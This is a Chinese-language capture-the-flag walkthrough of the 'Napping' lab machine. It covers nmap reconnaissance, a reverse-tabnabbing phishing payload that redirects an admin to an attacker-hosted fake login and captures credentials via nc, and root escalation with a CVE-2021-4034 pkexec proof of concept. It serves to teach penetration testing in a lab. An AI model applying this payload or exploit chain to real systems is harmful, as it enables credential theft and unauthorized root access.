# 主机信息

    
    
    kali：192.168.3.76
    napping：192.168.31.47
    

# 信息收集

使用Nmap探测目标主机发现开放22、80两个端口

    
    
    nmap -A -p- 192.168.31.47
    

![image](https://image.3001.net/images/20220222/1645542694_6214fd267cf8c9a330101.png!small)  
访问80端口发现是一个登录页和一个注册页  
![image](https://image.3001.net/images/20220222/1645542708_6214fd348af30b4466532.png!small)  
![image](https://image.3001.net/images/20220222/1645542716_6214fd3c9a7bee1c0e770.png!small)  
查看这两个网页的源码没有发现有价值的信息  
![image](https://image.3001.net/images/20220222/1645542725_6214fd457b16ca62d9603.png!small)  
![image](https://image.3001.net/images/20220222/1645542734_6214fd4ef1e0bc6ce5840.png!small)  
尝试注册一个账户，登录后发现存在一个输入框  
![image](https://image.3001.net/images/20220222/1645542742_6214fd563d957747d6b0a.png!small)  
输入后会生成一个超链接点击会进行跳转  
![image](https://image.3001.net/images/20220222/1645542755_6214fd63c8fef4c4d105f.png!small)  
根据网页的描述，在输入一个网址之后，管理员会进行审核，且这种生成的URL容易存在tabnabbing攻击  
![image](https://image.3001.net/images/20220222/1645542763_6214fd6bf18c35e7ad906.png!small)

# 漏洞利用

首先从真网站下载一个网页

    
    
    wget http://192.168.31.47/index.php
    

![image](https://image.3001.net/images/20220222/1645542772_6214fd74421c120590b44.png!small)  
然后再创建一个html文件，写入钓鱼网站的代码(文中该文件名为1.html)

    
    
    <!DOCTYPE html>
    <html>
    <body>
        <script>
            if(window.opener) window.opener.parent.location.replace('http://192.168.31.76:8080/index.html');
            if(window.opener  != window) window.opener.parent.location.replace('http://192.168.31.76:8080/index.html');
        </script>
    </body>
    </html>
    

然后在网页目录下使用python开启一个http服务，使用nc监听钓鱼网站中使用的端口，在正常网页中填写构造的URL提交后，等待2-3分钟左右，NC就会返回一个用户名和密码  
![image](https://image.3001.net/images/20220222/1645542781_6214fd7d90b5963f1fb44.png!small)  
使用这个密码登录web界面，发现密码错误  
![image](https://image.3001.net/images/20220222/1645542791_6214fd87377e1f9dbef0e.png!small)  
然后尝试ssh登录，发现可以登录成功  
![image](https://image.3001.net/images/20220222/1645542806_6214fd96db48416f05933.png!small)  
查看daniel用户的家目录没有发现有用的信息  
![image](https://image.3001.net/images/20220222/1645542814_6214fd9eb2502db6c5b93.png!small)  
然后查看adrian用户家目录下存在三个文件  
![image](https://image.3001.net/images/20220222/1645542821_6214fda59a341129b0968.png!small)  
第一个是判断网站是否正常启动，并打印时间  
![image](https://image.3001.net/images/20220222/1645542832_6214fdb0a12763931b807.png!small)  
这个文件为`query.py`脚本执行写入的log文件  
![image](https://image.3001.net/images/20220222/1645542841_6214fdb90f34e00693c70.png!small)  
查看user.txt发现没有权限  
![image](https://image.3001.net/images/20220222/1645542849_6214fdc165b12683c2aaa.png!small)

# 提权

查看系统版本分析该网站可能存在CVE-2021-4034 polkit的pkexec本地权限提升漏洞  
![image](https://image.3001.net/images/20220222/1645542859_6214fdcb498063e07180b.png!small)  
然后查看gcc是否存在和版本号  
![image](https://image.3001.net/images/20220222/1645542867_6214fdd39388cceb14f26.png!small)  
将cve-2021-4034漏洞的poc下载到服务器后，使用gcc进行编译  
![image](https://image.3001.net/images/20220222/1645542923_6214fe0b894ac18b435a2.png!small)  
查看编译后文件  
![image](https://image.3001.net/images/20220222/1645542935_6214fe170d140e7b3a06e.png!small)  
执行编译文件获得root权限  
![image](https://image.3001.net/images/20220222/1645542942_6214fe1ecdbae3521bae5.png!small)  
查看flag  
![image](https://image.3001.net/images/20220222/1645542950_6214fe26ab056f8447c45.png!small)

